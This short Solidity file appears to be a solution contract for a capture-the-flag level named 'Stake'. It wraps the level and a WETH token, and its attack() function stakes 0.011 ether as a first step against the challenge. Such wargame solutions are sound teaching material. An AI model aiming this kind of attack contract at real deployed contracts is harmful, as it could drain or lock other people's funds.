// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;

import "./Stake.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";

contract Solution {
    Stake level;
    IERC20 weth;

    constructor(address lev, address w) {
        level = Stake(lev);
        weth = IERC20(w);
    }

    function attack() public payable {
        level.StakeETH{value: 0.011 ether}();
    }
}
